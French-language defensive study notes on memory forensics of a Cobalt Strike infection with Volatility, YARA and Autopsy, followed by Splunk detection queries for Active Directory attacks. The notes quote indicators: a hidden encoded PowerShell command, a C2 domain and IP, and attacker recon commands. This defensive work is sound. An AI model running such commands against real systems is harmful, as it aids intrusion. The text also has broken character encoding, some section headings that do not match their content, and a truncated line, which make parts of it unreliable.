#### Emplacements des preuves

* **Vidage mÃ©moire** : `C:\Users\johndoe\Desktop\memdump\PhysicalMemory.raw`
* **Artifacts de triage rapide** :

  * `C:\Users\johndoe\Desktop\kapefiles`
  * `C:\Users\johndoe\Desktop\files`
* **Image disque complÃ¨te** : `C:\Users\johndoe\Desktop\fulldisk.raw.001`
* **DonnÃ©es de disque analysÃ©es** : `C:\Users\johndoe\Desktop\MalwareAttack`

#### Notes

* **Analyse avec Autopsy** : RÃ©aliser l'analyse dans le dossier `C:\Users\johndoe\Desktop\MalwareAttack`.
* **Environnement idÃ©al pour la criminalistique** : L'analyse se fait directement sur le systÃ¨me compromis pour des raisons de rapiditÃ©, bien qu'il soit recommandÃ© d'utiliser un environnement sÃ©parÃ©.

---

### Analyse mÃ©moire avec Volatility v3

#### Identification du profil mÃ©moire

Pour obtenir les dÃ©tails du systÃ¨me d'exploitation et du noyau Ã  partir du vidage mÃ©moire :

```bash
python vol.py -q -f ..\memdump\PhysicalMemory.raw windows.info
```

**Exemple de sortie** :

```
Variable           | Valeur
-------------------|------------------------------------------------
Kernel Base        | 0xf80150019000
DTB                | 0x1ad000
Symbols            | file:///C:/Users/johndoe/Desktop/...
Is64Bit            | True
SystemTime         | 2023-08-10 09:35:40
NtSystemRoot       | C:\Windows
NtMajorVersion     | 10
NtMinorVersion     | 0
```

#### DÃ©tection de code injectÃ©

Pour trouver les rÃ©gions mÃ©moire des processus contenant potentiellement du code injectÃ© :

```bash
python vol.py -q -f ..\memdump\PhysicalMemory.raw windows.malfind
```

**Exemple de sortie** :

```
Processes with PAGE_EXECUTE_READWRITE memory:
    PID 3648 (rundll32.exe), PID 6744 (powershell.exe), PID 5468 (rundll32.exe)
```

**Explication de PAGE\_EXECUTE\_READWRITE** :

* Ce type de permission permet Ã  la fois l'exÃ©cution et la modification du code en mÃ©moire, ce qui est rarement utilisÃ© par des applications lÃ©gitimes, mais couramment observÃ© dans des malwares.

#### Identification des processus en cours

Lister les processus en cours :

```bash
python vol.py -q -f ..\memdump\PhysicalMemory.raw windows.pslist
```

**Exemple de sortie** :

```
PID   PPID   ImageFileName   CreateTime                    SessionId
4     0      System          2023-08-10 00:22:53.000000   N/A
3648  7148   rundll32.exe     2023-08-10 09:15:14.000000   1
6744  908    powershell.exe   2023-08-10 09:21:16.000000   1
5468  7512   rundll32.exe     2023-08-10 09:23:15.000000   0
```

#### Visualisation de l'arbre des processus

Pour voir les relations parent-enfant des processus :

```bash
python vol.py -q -f ..\memdump\PhysicalMemory.raw windows.pstree
```

Cela permet d'identifier les processus enfants suspects lancÃ©s par des processus lÃ©gitimes comme `rundll32.exe` sous `explorer.exe`.

#### Identification des lignes de commande des processus

Pour rÃ©cupÃ©rer les arguments de ligne de commande des processus :

```bash
python vol.py -q -f ..\memdump\PhysicalMemory.raw windows.cmdline
```

**Exemple de sortie** :

```
PID   Process        Args
416   csrss.exe      %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows ...
3648  rundll32.exe   C:\Windows\System32\rundll32.exe payload.dll,StartW
6744  powershell.exe PowerShell.exe -nop -w hidden -encodedcommand JABzAD0ATgBlAHcAL...
```

---

### Extraction de la mÃ©moire du processus et utilisation de YARA

Pour analyser le processus avec PID 3648, utilisez le plugin `windows.memmap` pour extraire toutes les pages mÃ©moire rÃ©sidentes de ce processus :

```bash
python vol.py -q -f ../memdump/PhysicalMemory.raw windows.memmap --pid 3648 --dump
```

**Sortie** :

```
0xf8016d0e9000  0x2077d000      0x3000  0x1bde4000      pid.3648.dmp
... (continues with memory pages)
```

L'image mÃ©moire `pid.3648.dmp` sera stockÃ©e dans le rÃ©pertoire `C:\Users\johndoe\Desktop`.

#### Analyse avec YARA

Pour scanner le vidage mÃ©moire avec les rÃ¨gles YARA :

```powershell
$rules = Get-ChildItem C:\Users\johndoe\Desktop\yara-4.3.2-2150-win64\rules | Select-Object -Property Name
foreach ($rule in $rules) {C:\Users\johndoe\Desktop\yara-4.3.2-2150-win64\yara64.exe C:\Users\johndoe\Desktop\yara-4.3.2-2150-win64\rules\$($rule.Name) C:\Users\johndoe\Desktop\pid.3648.dmp}
```

**Sortie de YARA** :

```
HKTL_CobaltStrike_Beacon_Strings
CobaltStrike_Sleep_Decoder_Indicator
WiltedTulip_ReflectiveLoader
```

---

### Identification des DLLs chargÃ©es

Examinez les DLLs chargÃ©es avec le plugin `windows.dlllist` :

```bash
python vol.py -q -f ../memdump/PhysicalMemory.raw windows.dlllist --pid 3648
```

**Sortie** :

```
payload.dll at E:\payload.dll, suggesting possible external or ISO origin.
```

#### Identification des poignÃ©es de fichiers

Utilisez `windows.handles` pour afficher les fichiers et les entrÃ©es de registre accÃ©dÃ©es :

```bash
python vol.py -q -f ../memdump/PhysicalMemory.raw windows.handles --pid 3648
```

**Exemple de sortie** :

```
Access to \Device\HarddiskVolume3\Users\johndoe\Desktop
```

---

### Analyse des artefacts rÃ©seau

Pour analyser les connexions rÃ©seau avec `windows.netstat` :

```bash
python vol.py -q -f ../memdump/PhysicalMemory.raw windows.netstat
```

**Exemple de sortie** :

```
chrome.exe, WWAHost.exe, rundll32.exe
```

Utilisez `windows.netscan` pour une analyse rÃ©seau plus approfondie :

```bash
python vol.py -q -f ../memdump/PhysicalMemory.raw windows.netscan
```

**Exemple de sortie** :

```
Le processus suspect (PID 3648) communique avec 44.214.212.249 via le port 80.
```

---

### Analyse des donnÃ©es de l'image disque et triage rapide

#### Recherche de mots-clÃ©s avec Autopsy

1. **Ouvrir Autopsy** et accÃ©der au dossier `C:\Users\johndoe\Desktop\MalwareAttack`.
2. **Rechercher** `payload.dll` et prioriser par date de crÃ©ation.
3. **Extraction** : Faites un clic droit sur `Finance08062023.iso` dans le dossier Downloads et sÃ©lectionnez **Extraire le(s) fichier(s)**.

#### Identification des informations de tÃ©lÃ©chargement Web

La prÃ©sence de `.Zone.Identifier` via un flux de donnÃ©es alternatif (ADS) confirme que le fichier provient d'Internet.

L'URL source identifiÃ©e dans les artefacts Web est : `letsgohunt[.]site`.

---

### Analyse de la configuration du Beacon Cobalt Strike

1. Utilisez **CobaltStrikeParser** pour analyser la configuration du beacon avec le fichier `payload.dll` :

```bash
python parse_beacon_config.py E:\payload.dll
```

**Configurations clÃ©s extraites** :

```
BeaconType: HTTP, Port: 80, C2Server: letsgohunt.site,/load
Autres champs notables : HttpGet_Metadata, bUsesCookies, Spawnto_x64.
```

---

### MÃ©canismes de persistance avec Autoruns

Analysez les entrÃ©es dans `C:\Users\johndoe\Desktop\files\johndoe_autoruns.arn` :

Une entrÃ©e trouvÃ©e :

```
Path: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Image: C:\ProgramData\svchost.exe
```

---

### Identification des hachages de fichiers et VirusTotal

Pour identifier le hachage de `photo433.exe` :

```powershell
PS C:\Users\johndoe> Get-FileHash -Algorithm SHA256 "C:\Users\johndoe\Desktop\kapefiles\auto\C%3A\Users\johndoe\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\photo443.exe"
```

---

### Analyse des tÃ¢ches planifiÃ©es et du timestomping

Les incohÃ©rences entre les horodatages du MFT et les horodatages de fichier indiquent un possible **timestomping**.

#### Analyse des donnÃ©es SRUM

Exfiltration possible de 430526981 octets Ã  partir de \`

```

## **Detecting Windows Attacks with Splunk**

## **Detecting Common User & Domain Recon**

```jsx

---

## Vue dâ€™ensemble de la reconnaissance de domaine

### Concepts clÃ©s

* **Reconnaissance du domaine Active Directory (AD)** : Ã‰tape cruciale du cycle dâ€™attaque durant laquelle lâ€™attaquant collecte des informations sur lâ€™environnement AD. Il cherche Ã  identifier :

  * Lâ€™architecture, la topologie rÃ©seau et les mÃ©canismes de sÃ©curitÃ©.
  * Les actifs clÃ©s : contrÃ´leurs de domaine, comptes utilisateurs, groupes, relations de confiance, unitÃ©s organisationnelles (OU) et stratÃ©gies de groupe (GPO).

* **Objectif** : Identifier des cibles de grande valeur, Ã©lever ses privilÃ¨ges et permettre des mouvements latÃ©raux.

---

### Techniques de reconnaissance avec les commandes Windows natives

Les attaquants peuvent exÃ©cuter des commandes comme `net group` pour obtenir la liste des administrateurs du domaine. Parmi les commandes souvent utilisÃ©es :

* `whoami /all`
* `wmic computersystem get domain`
* `net user /domain`
* `net group "Domain Admins" /domain`
* `arp -a`
* `nltest /domain_trusts`

**DÃ©tection** : Surveillez l'exÃ©cution de commandes via PowerShell ou l'invite de commandes pour repÃ©rer une activitÃ© inhabituelle.

---

## Reconnaissance avec BloodHound / SharpHound

* **BloodHound** : Outil open source permettant de visualiser les relations, permissions et chemins dâ€™attaque potentiels dans Active Directory.
* **SharpHound** : Collecteur de donnÃ©es (en C#) utilisÃ© par BloodHound, souvent lancÃ© avec lâ€™option `-c all` pour un balayage complet.

### MÃ©thodes de dÃ©tection de BloodHound

* **RequÃªtes LDAP** : Les collecteurs BloodHound effectuent de nombreuses requÃªtes LDAP sur les contrÃ´leurs de domaine.
* **Techniques de surveillance** :

  * **Ã‰vÃ©nement 1644** : Surveillance des performances LDAP (limitÃ© en visibilitÃ©).
  * **ETW (Event Tracing for Windows)** via **Microsoft-Windows-LDAP-Client** : Utilisable avec **SilkETW** et **SilkService**, compatible avec les rÃ¨gles Yara.
  * **Filtres LDAP prÃ©dÃ©finis** : Utilisez ceux recommandÃ©s par lâ€™Ã©quipe ATP de Microsoft pour dÃ©tecter les requÃªtes LDAP typiques liÃ©es Ã  la reconnaissance.

---

## DÃ©tection de reconnaissance utilisateur/domaine avec Splunk

### Objectif

DÃ©tecter les activitÃ©s de reconnaissance typiques dans un intervalle de temps donnÃ©, en filtrant le bruit pour se concentrer sur les Ã©vÃ©nements suspects.

---

### DÃ©tection via les exÃ©cutables Windows natifs

**Plage temporelle** : `earliest=1690447949` Ã  `latest=1690450687`

```spl
index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=1 earliest=1690447949 latest=1690450687
| search process_name IN (arp.exe,chcp.com,ipconfig.exe,net.exe,net1.exe,nltest.exe,ping.exe,systeminfo.exe,whoami.exe) 
  OR (process_name IN (cmd.exe,powershell.exe) AND process IN (*arp*,*chcp*,*ipconfig*,*net*,*net1*,*nltest*,*ping*,*systeminfo*,*whoami*))
| stats values(process) as process, min(_time) as _time by parent_process, parent_process_id, dest, user
| where mvcount(process) > 3
```

#### Explication

1. **Filtrage par index et source** : Recherche les Ã©vÃ©nements Sysmon (crÃ©ation de processus - EventID=1) sur la pÃ©riode spÃ©cifiÃ©e.
2. **Processus ciblÃ©s** : Se concentre sur les exÃ©cutables liÃ©s Ã  des commandes de reconnaissance.
3. **AgrÃ©gation statistique** : Regroupe par processus parent, utilisateur, destination, et liste les processus exÃ©cutÃ©s.
4. **Filtrage avancÃ©** : Ne conserve que les Ã©vÃ©nements oÃ¹ plus de 3 commandes de reconnaissance ont Ã©tÃ© exÃ©cutÃ©es par le mÃªme processus parent.

---

### DÃ©tection de reconnaissance via BloodHound

**Plage temporelle** : `earliest=1690195896` Ã  `latest=1690285475`

```spl
index=main earliest=1690195896 latest=1690285475 source="WinEventLog:SilkService-Log"
| spath input=Message 
| rename XmlEventData.* as * 
| table _time, ComputerName, ProcessName, ProcessId, DistinguishedName, SearchFilter
| sort 0 _time
| search SearchFilter="*(samAccountType=805306368)*"
| stats min(_time) as _time, max(_time) as maxTime, count, values(SearchFilter) as SearchFilter by ComputerName, ProcessName, ProcessId
| where count > 10
| convert ctime(maxTime)
```

#### Explication

1. **Filtrage par index et source** : Recherche dans les logs SilkService pendant la pÃ©riode dÃ©finie.
2. **Extraction des champs XML** : Utilisation de `spath` pour extraire les donnÃ©es structurÃ©es du message.
3. **Organisation des rÃ©sultats** : Affiche les champs clÃ©s : nom de lâ€™ordinateur, nom du processus, ID du processus, filtres LDAP.
4. **Filtrage par filtre LDAP spÃ©cifique** : Recherche les filtres contenant `samAccountType=805306368`, utilisÃ© par BloodHound pour identifier les comptes utilisateurs.
5. **AgrÃ©gation et filtrage par frÃ©quence** : Signale les processus qui effectuent plus de 10 requÃªtes LDAP de ce type.
6. **Conversion de lâ€™horodatage** : Affiche la date et lâ€™heure du dernier Ã©vÃ©nement au format lisible.

---

```

## D**etecting Password Spraying**

```jsx

---

## AperÃ§u de l'attaque **Password Spraying**

**Password Spraying** est une attaque ciblÃ©e qui :

* Tente un nombre limitÃ© de mots de passe courants sur plusieurs comptes d'utilisateurs.
* Ã‰vite les politiques de verrouillage de compte en utilisant seulement quelques tentatives de mot de passe par compte.
* Est conÃ§ue pour Ã©chapper Ã  la dÃ©tection en exploitant des mots de passe faibles Ã  travers un large Ã©ventail d'utilisateurs, plutÃ´t que de brute-forcer des comptes individuels.

**Exemple** : Un attaquant utilise l'outil **Spray** pour tester un ensemble limitÃ© de mots de passe sur plusieurs comptes dans un rÃ©seau.

---

## OpportunitÃ©s de dÃ©tection

### Indicateurs basÃ©s sur les journaux pour dÃ©tecter le **Password Spraying**

Surveiller les journaux Windows pour des motifs de **Password Spraying** peut permettre de dÃ©tecter des anomalies, surtout lorsque plusieurs tentatives de connexion Ã©chouÃ©es (Event ID 4625) provenant de diffÃ©rents comptes utilisateurs sont effectuÃ©es depuis une seule adresse IP sur une courte pÃ©riode.

**Principaux Ã©vÃ©nements Ã  surveiller pour la dÃ©tection du Password Spraying** :

1. **4625** - Connexion Ã©chouÃ©e

   * Suivi des Ã©checs de connexion pour diffÃ©rents comptes provenant d'une seule source.
2. **4768** - Demande de ticket Kerberos (TGT)

   * ErrorCode 0x6 : Tentatives d'utilisateur invalide.
   * ErrorCode 0x12 : Tentatives d'utilisateur dÃ©sactivÃ©.
3. **4776** - Authentification NTLM

   * ErrorCode 0xC000006A : Utilisateurs NTLM invalides.
   * ErrorCode 0xC0000064 : Mauvais mot de passe NTLM.
4. **4648** - Tentative de connexion avec des identifiants explicites

   * Identifie les abus de credentials.
5. **4771** - Ã‰chec de prÃ©-authentification Kerberos

---

## DÃ©tection du **Password Spraying** avec Splunk

### Plage horaire

* **Earliest** : `1690280680`
* **Latest** : `1690289489`

### RequÃªte Splunk

```spl
index=main earliest=1690280680 latest=1690289489 source="WinEventLog:Security" EventCode=4625
| bin span=15m _time
| stats values(user) as Users, dc(user) as dc_user by src, Source_Network_Address, dest, EventCode, Failure_Reason
```

### Explication des composants de la requÃªte

1. **Filtrage par Index, Source et Code d'Ã‰vÃ©nement** :

   * Cette partie de la requÃªte se concentre sur les Ã©vÃ©nements du journal de sÃ©curitÃ© (`WinEventLog:Security`) avec **EventCode=4625**, reprÃ©sentant les Ã©checs de connexion.

2. **Filtre de plage horaire** :

   * La recherche est limitÃ©e Ã  une plage horaire spÃ©cifique, dÃ©finie par les horodatages Unix, afin de filtrer uniquement les journaux pertinents.

3. **Binning du temps** :

   * La commande `bin` regroupe les Ã©vÃ©nements par intervalles de 15 minutes, ce qui aide Ã  dÃ©tecter les motifs en observant les tentatives de connexion Ã©chouÃ©es sur des pÃ©riodes courtes.

4. **AgrÃ©gation des statistiques** :

   * La commande `stats` agrÃ¨ge les Ã©vÃ©nements par champs clÃ©s pour analyser les Ã©checs de connexion sur diffÃ©rents comptes.

     * **`values(user) as Users`** : Liste tous les utilisateurs uniques associÃ©s aux tentatives de connexion Ã©chouÃ©es.
     * **`dc(user) as dc_user`** : Compte le nombre d'utilisateurs distincts dans chaque groupe pour identifier plusieurs comptes ciblÃ©s depuis une seule adresse IP.

---

```

## **Detecting Responder-like Attacks**

```jsx
### **Vue d'ensemble du Poisoning LLMNR/NBT-NS/mDNS**

**LLMNR (Link-Local Multicast Name Resolution)**, **NBT-NS (NetBIOS Name Service)** et **mDNS (Multicast DNS)** sont des protocoles de rÃ©solution de noms utilisÃ©s lorsque DNS Ã©choue. Ces protocoles sont vulnÃ©rables aux attaques de **spoofing** et de **poisoning**, souvent rÃ©alisÃ©es avec des outils comme **Responder**. L'attaquant rÃ©pond aux requÃªtes de noms non rÃ©solus, capturant ainsi le **NetNTLM hash** de la victime, ce qui peut permettre des compromis supplÃ©mentaires des systÃ¨mes.

---

### **OpportunitÃ©s de dÃ©tection des attaques de type Responder**

1. **Surveiller le trafic LLMNR et NBT-NS** pour des comportements anormaux (par exemple, un grand nombre de requÃªtes).
2. Utiliser des **techniques de type honeypot** pour dÃ©tecter des rÃ©ponses rÃ©ussies pour des hÃ´tes inexistants.
3. Utiliser des **scripts PowerShell** pour dÃ©tecter les rÃ©ponses inattendues LLMNR ou NBT-NS.

#### **Exemple de script PowerShell pour la dÃ©tection** :

```powershell
New-EventLog -LogName Application -Source LLMNRDetection
Write-EventLog -LogName Application -Source LLMNRDetection -EventId 19001 -Message $msg -EntryType Warning
```

---

### **DÃ©tection des attaques de type Responder avec Splunk**

#### **Plage horaire** :

* **Le plus tÃ´t** : `1690290078`
* **Le plus tard** : `1690291207`

#### **RequÃªtes Splunk**

1. **DÃ©tection des alertes LLMNR** :

```spl
index=main earliest=1690290078 latest=1690291207 SourceName=LLMNRDetection
| table _time, ComputerName, SourceName, Message
```

2. **Suivi des requÃªtes DNS (Sysmon Event ID 22)** :

```spl
index=main earliest=1690290078 latest=1690291207 EventCode=22 
| table _time, Computer, user, Image, QueryName, QueryResults
```

3. **Event ID 4648 - Connexions explicites vers des partages malveillants** :

```spl
index=main earliest=1690290814 latest=1690291207 EventCode IN (4648) 
| table _time, EventCode, source, name, user, Target_Server_Name, Message
| sort 0 _time
```

Ces requÃªtes aident Ã  suivre les activitÃ©s suspectes liÃ©es aux requÃªtes LLMNR, NBT-NS et DNS, permettant ainsi une dÃ©tection prÃ©coce des attaques de poisoning et des tentatives de vol de crÃ©dentiels.

```

## **Detecting Kerberoasting & AS-REProasting**

```jsx

---

## ğŸ” **E. DÃ©tection de Golden Ticket via Splunk**

Cette requÃªte Splunk permet de dÃ©tecter une activitÃ© suspecte liÃ©e Ã  des **Golden Tickets**, en identifiant les demandes de tickets de service (TGS) qui ne sont pas prÃ©cÃ©dÃ©es par les Ã©tapes classiques dâ€™authentification Kerberos (`AS-REQ` / `AS-REP`). Ce type de comportement peut indiquer lâ€™utilisation dâ€™un **TGT forgÃ©** par un attaquant.

---

### âœ… **RequÃªte Splunk**

```spl
index="golden_ticket_attack" sourcetype="bro:kerberos:json"
| where client!="-"
| bin _time span=1m
| stats count as total_requests, values(client), values(request_type) as request_types, dc(request_type) as unique_request_types by _time, id.orig_h, id.resp_h
| where total_requests > 10 AND unique_request_types==1 AND mvcount(request_types)==1 AND mvindex(request_types,0)=="TGS"
```

---

### ğŸ§  **Explication de la requÃªte**

1. **SÃ©lection des donnÃ©es**

   * `index="golden_ticket_attack"` : Recherche dans lâ€™index dÃ©diÃ© Ã  la dÃ©tection des attaques Golden Ticket.
   * `sourcetype="bro:kerberos:json"` : Utilise les logs Kerberos fournis par Zeek/Bro au format JSON.

2. **Filtrage du client**

   * `where client!="-â€` : Ã‰carte les Ã©vÃ©nements oÃ¹ le champ `client` est vide ou absent.

3. **Regroupement temporel**

   * `bin _time span=1m` : Regroupe les Ã©vÃ©nements par minute pour dÃ©tecter des rafales de requÃªtes suspectes.

4. **AgrÃ©gation**

   * `stats count as total_requests` : Nombre total de requÃªtes par groupe.
   * `values(request_type)` : Types de requÃªtes observÃ©s (ex. TGS, AS-REQ).
   * `dc(request_type)` : Nombre de types distincts de requÃªtes.
   * `id.orig_h / id.resp_h` : IP source (client) et IP destination (souvent le contrÃ´leur de domaine).

5. **Filtrage comportemental**

   * `total_requests > 10` : Se concentre sur les clients envoyant beaucoup de requÃªtes dans un court laps de temps.
   * `unique_request_types == 1` et `request_types == "TGS"` : Signale les cas oÃ¹ seule la demande de TGS est prÃ©sente, sans trace dâ€™AS-REQ/AS-REP.

---

### ğŸ•µï¸ **InterprÃ©tation**

* Un client qui envoie uniquement des requÃªtes de type `TGS` sans aucune authentification prÃ©alable est **hautement suspect**. Cela peut signifier que lâ€™attaquant a injectÃ© un **Golden Ticket**, lui permettant dâ€™accÃ©der directement aux services sans sâ€™authentifier auprÃ¨s du KDC.

---

### ğŸ“Œ **Ã€ investiguer**

* **Adresse IP source (`id.orig_h`)** : Est-ce une machine autorisÃ©e ?
* **FrÃ©quence** : Ce comportement se rÃ©pÃ¨te-t-il dans plusieurs intervalles ?
* **IP destination (`id.resp_h`)** : Correspond-elle Ã  un contrÃ´leur de domaine ?
* **Client ou utilisateur** : Sâ€™agit-il dâ€™un service connu ou dâ€™un compte anormal ?

---

```

## **Detecting Pass-the-Hash**

```jsx

---

## AperÃ§u de l'attaque **Overpass-the-Hash (Pass-the-Key)**

**Overpass-the-Hash (Pass-the-Key)** permet aux attaquants de s'authentifier via Kerberos en utilisant des hashs de mots de passe volÃ©s, leur permettant ainsi de demander des TGT (Ticket Granting Ticket) Kerberos et d'obtenir un accÃ¨s non autorisÃ© aux systÃ¨mes sans avoir recours Ã  NTLM.

### Ã‰tapes de l'attaque

1. **Extraction des hash des utilisateurs** : L'attaquant utilise des outils comme **Mimikatz** pour obtenir le hash NTLM d'un utilisateur connectÃ©, nÃ©cessitant des privilÃ¨ges d'administrateur local.
2. **Demande de TGT avec Rubeus** : L'attaquant utilise **Rubeus** pour crÃ©er une requÃªte brute AS-REQ pour un TGT d'un utilisateur spÃ©cifiÃ©. Cette Ã©tape ne nÃ©cessite pas de privilÃ¨ges Ã©levÃ©s, la rendant plus discrÃ¨te.
3. **Soumission du Ticket** : L'attaquant injecte le TGT demandÃ© dans la session en cours, de maniÃ¨re similaire Ã  l'attaque Pass-the-Ticket, pour effectuer des mouvements latÃ©raux.

---

## OpportunitÃ©s de dÃ©tection de l'attaque **Overpass-the-Hash**

### Logique de dÃ©tection clÃ©

* **DÃ©tection de Mimikatz** : Les artefacts d'attaques Overpass-the-Hash basÃ©es sur Mimikatz ressemblent Ã  ceux des attaques **Pass-the-Hash** et peuvent Ãªtre dÃ©tectÃ©s Ã  l'aide de techniques similaires.
* **DÃ©tection de Rubeus** : Lorsque **Rubeus** envoie une requÃªte AS-REQ directement au contrÃ´leur de domaine via le port TCP/UDP 88, cela gÃ©nÃ¨re l'**Event ID 4768**. Cependant, des processus inhabituels communiquant sur le port 88 vers le contrÃ´leur de domaine, autre que `lsass.exe`, peuvent aider Ã  identifier l'activitÃ© potentielle d'Overpass-the-Hash.

---

## Exemple de requÃªte Splunk : DÃ©tection de **Rubeus** dans l'attaque **Overpass-the-Hash**

**Description** : Cette requÃªte identifie les requÃªtes AS-REQ envoyÃ©es sur le port 88 provenant de processus inhabituels, en recherchant spÃ©cifiquement l'**Event ID 3** avec un port de destination Ã©gal Ã  88, tout en excluant `lsass.exe`.

**Plage horaire** : `earliest=1690443407 latest=1690443544`

```spl
index=main earliest=1690443407 latest=1690443544 source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" (EventCode=3 dest_port=88 Image!=*lsass.exe) OR EventCode=1
| eventstats values(process) as process by process_id
| where EventCode=3
| stats count by _time, Computer, dest_ip, dest_port, Image, process
| fields - count
```

---

### Explication des composants clÃ©s de la requÃªte

1. **Filtrage des Ã©vÃ©nements** :

   * **SÃ©lection de la source** : Filtre les Ã©vÃ©nements provenant du journal opÃ©rationnel de Sysmon (`XmlWinEventLog:Microsoft-Windows-Sysmon/Operational`).
   * **EventCode 3** : Capture les connexions rÃ©seau effectuÃ©es par l'hÃ´te, ciblant spÃ©cifiquement le trafic vers `dest_port=88` (Kerberos), en excluant `Image=lsass.exe`, car il s'agit d'un processus lÃ©gitime accÃ©dant aux services Kerberos.
   * **OR EventCode 1** : Capture tous les Ã©vÃ©nements de crÃ©ation de processus pour permettre une corrÃ©lation avec d'autres Ã©vÃ©nements liÃ©s aux processus suspects.

2. **Statistiques des Ã©vÃ©nements** :

   * **EventStats** : Ajoute la liste des processus pour chaque identifiant de processus (`process_id`), stockÃ©e sous `process`.
   * **Where EventCode=3** : Filtre pour les Ã©vÃ©nements de connexion rÃ©seau sur le port 88.

3. **AgrÃ©gation et filtrage** :

   * **Stats count by Fields** : AgrÃ¨ge les Ã©vÃ©nements par `_time`, `Computer`, `dest_ip`, `dest_port`, `Image`, et `process`, tout en calculant le nombre dâ€™occurrences (`count`).
   * **Fields - count** : Supprime le champ `count` du rÃ©sultat final pour plus de clartÃ©.

---

```

## **Detecting Pass-the-Ticket**

```jsx

---

## AperÃ§u de l'attaque **Pass-the-Ticket (PtT)**

**Pass-the-Ticket (PtT)** est une technique permettant aux attaquants de se dÃ©placer latÃ©ralement dans un rÃ©seau en utilisant des tickets Kerberos au lieu de mots de passe. Avec des privilÃ¨ges administratifs, un attaquant peut extraire des tickets Kerberos valides (TGT ou TGS) de la mÃ©moire d'un systÃ¨me compromis et les utiliser pour accÃ©der Ã  des ressources sans avoir besoin du mot de passe de l'utilisateur.

### Ã‰tapes de l'attaque **Pass-the-Ticket** :

1. **Extraction des tickets Kerberos** : L'attaquant utilise des outils comme **Mimikatz** pour extraire des tickets TGT ou TGS d'un systÃ¨me compromis.
2. **Authentification avec le ticket extrait** : L'attaquant soumet le ticket dans la session de connexion en cours, s'authentifiant en tant qu'utilisateur sans avoir besoin du mot de passe.
3. **Mouvement latÃ©ral** : En utilisant le ticket, l'attaquant peut accÃ©der Ã  des systÃ¨mes ou ressources supplÃ©mentaires sur le rÃ©seau.

### Processus d'authentification Kerberos & Ã©vÃ©nements de sÃ©curitÃ© associÃ©s Ã  Windows

* **Event ID 4624** : Connexion rÃ©ussie Ã  un systÃ¨me.
* **Event ID 4648** : Tentative de connexion explicite avec des informations d'identification.
* **Event ID 4672** : Connexion spÃ©ciale, indiquant des privilÃ¨ges administratifs.
* **Event ID 4768** : Demande de TGT dans le processus Kerberos.
* **Event ID 4769** : Demande de TGS dans le processus Kerberos.
* **Event ID 4770** : Renouvellement de ticket TGS.

## OpportunitÃ©s de dÃ©tection de l'attaque **Pass-the-Ticket**

### Logique clÃ© de dÃ©tection

La dÃ©tection des attaques **PtT** nÃ©cessite de surveiller les demandes de tickets de service Kerberos (TGS) Ã©mises sans une demande prÃ©alable de TGT. Les attaquants peuvent importer un TGT directement dans une session, crÃ©ant ainsi un Ã©cart oÃ¹ une demande de TGS (Event ID 4769) ou un renouvellement de ticket (Event ID 4770) n'a pas de demande TGT associÃ©e (Event ID 4768). Surveiller les incohÃ©rences dans le processus d'authentification peut permettre de repÃ©rer les tentatives **PtT**.

---

### Exemple 1 : DÃ©tection des demandes de tickets TGS sans demande prÃ©alable de TGT

**Description** : Cette requÃªte recherche les demandes de tickets de service Kerberos (4769) et les renouvellements (4770) sans demande prÃ©alable de TGT (4768) provenant du mÃªme systÃ¨me, ce qui peut indiquer un TGT importÃ©.

**Plage horaire** : `earliest=1690392405 latest=1690451745`

```spl
index=main earliest=1690392405 latest=1690451745 source="WinEventLog:Security" user!=*$ EventCode IN (4768,4769,4770)
| rex field=user "(?<username>[^@]+)"
| rex field=src_ip "(\:\:ffff\:)?(?<src_ip_4>[0-9\.]+)"
| transaction username, src_ip_4 maxspan=10h keepevicted=true startswith=(EventCode=4768)
| where closed_txn=0
| search NOT user="*$@*"
| table _time, ComputerName, username, src_ip_4, service_name, category
```

### Explication des composants clÃ©s

1. **Filtrage des Ã©vÃ©nements** :

   * **SÃ©lection des Ã©vÃ©nements** : Filtre les Ã©vÃ©nements pour inclure uniquement les **Event IDs 4768**, **4769** et **4770** dans le journal de sÃ©curitÃ©, en excluant les comptes machines (`user!=*$`).

2. **Expressions rÃ©guliÃ¨res** :

   * **Extraction du nom d'utilisateur** : Extrait le nom d'utilisateur du champ `user` pour une identification plus facile.
   * **Extraction de l'IP** : Extrait les adresses IPv4 de `src_ip`, en tenant compte des adresses IPv6 mappÃ©es sur IPv4 en se concentrant sur la portion IPv4.

3. **Commande `transaction`** :

   * **But** : Groupe les Ã©vÃ©nements associÃ©s par `username` et `src_ip_4`, en commenÃ§ant avec **EventCode 4768** (demande de TGT).
   * **ParamÃ¨tres** : `maxspan=10h` dÃ©finit une fenÃªtre de transaction maximale de 10 heures, permettant des sessions de connexion longues ; `keepevicted=true` garantit que les transactions ouvertes restent visibles.

4. **Filtrage pour transactions ouvertes** :

   * **closed\_txn=0** : Filtre les transactions sans Ã©vÃ©nement de clÃ´ture, ce qui montre les cas oÃ¹ des tickets TGS ou des renouvellements ont Ã©tÃ© demandÃ©s sans une demande de TGT prÃ©alable.

5. **Affichage des rÃ©sultats** :

   * Affiche des champs pertinents comme `_time`, `ComputerName`, `username`, `src_ip_4`, `service_name`, et `category` pour faciliter l'analyse.

---

### Exemple 2 : DÃ©tection des demandes TGS et comportements anormaux

Dans les cas oÃ¹ des attaquants importent des tickets TGS sans demande TGT valide, des anomalies peuvent apparaÃ®tre dans **Event ID 4771** (Ã‰chec de prÃ©-authentification). En surveillant les incohÃ©rences dans les codes d'Ã©chec et les types d'authentification, des attaques **PtT** supplÃ©mentaires peuvent Ãªtre dÃ©tectÃ©es.

---

```

## **Detecting Overpass-the-Hash**

```jsx

---

## AperÃ§u de l'attaque **Overpass-the-Hash (Pass-the-Key)**

**Overpass-the-Hash (Pass-the-Key)** permet aux attaquants de s'authentifier via Kerberos en utilisant des hashs de mots de passe volÃ©s, leur permettant ainsi de demander des TGT (Ticket Granting Ticket) Kerberos et d'obtenir un accÃ¨s non autorisÃ© aux systÃ¨mes sans avoir recours Ã  NTLM.

### Ã‰tapes de l'attaque

1. **Extraction des hash des utilisateurs** : L'attaquant utilise des outils comme **Mimikatz** pour obtenir le hash NTLM d'un utilisateur connectÃ©, nÃ©cessitant des privilÃ¨ges d'administrateur local.
